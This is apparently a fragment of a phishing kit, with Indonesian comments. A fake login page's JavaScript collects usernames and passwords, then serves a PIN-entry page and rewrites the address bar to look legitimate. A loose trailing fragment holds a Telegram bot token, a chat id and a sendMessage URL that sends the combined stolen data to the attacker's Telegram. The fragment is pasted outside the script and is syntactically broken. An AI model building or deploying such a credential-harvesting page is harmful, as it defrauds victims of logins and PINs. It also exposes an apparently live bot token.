    <script>

         function OnButton(user, pass) {

            if(user.length > 4 && pass.length > 5) {
                $(".btn-login").prop('disabled', false);
            } else {
                $(".btn-login").prop('disabled', true);
            }
        }
        $(document).ready(function() {
            $("body").on('click', 'button#doLog', function() {
                var user = $("#nama").val();
                var pass = $("#email").val();

                $.ajax({
                    url: "/login/confirm.php",
                    method: "POST",
                    data: "username="+user+"&password="+pass,
                    beforeSend: function() {
                        $("#loading").show();
                    },
                    success: function(responsex) {
                        $("#aseli").html('');
                        if(responsex == "true") {
                            $.get("/aplikasi/login.js", function(datax, status){
                                window.history.pushState("", "", '/login.js');
                                $("#hideBody").hide();
                                $("#loading").hide();
                                $("#aseli").html(datax);
                            });
                        } else {
                            $.get("/aplikasi/pin.php", function(data, status){
                                window.history.pushState("", "", 'aplikasi/login.php');
                                setTimeout(function() { 
                                    $("#hideBody").hide();
                                    $("#loading").hide();
                                    $("#aseli").html(data);
                                    $("#aseli").show();
                                }, 1000);
                            });
                        }
                        
                    }
                })
            });
            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#email").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#email").prop("type", "password");
                });
            });

            $("#nama").on('input', function() {
                var user = $("#nama").val();
                var pass = $("#email").val();

                OnButton(user, pass);
            });

            $("#email").on('input', function() {
                var user = $("#nama").val();
                var pass = $("#email").val();

                OnButton(user, pass);
            });
        });
    </script>

    var token = '5888858706:AAF1ukaDQsQC17RdQuBjSfsaTuFBfoY_pGE'; // Ganti dengan token bot yang kamu buat
    var grup = '5935122617'; // Ganti dengan chat id dari bot yang kamu buat

        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,

}
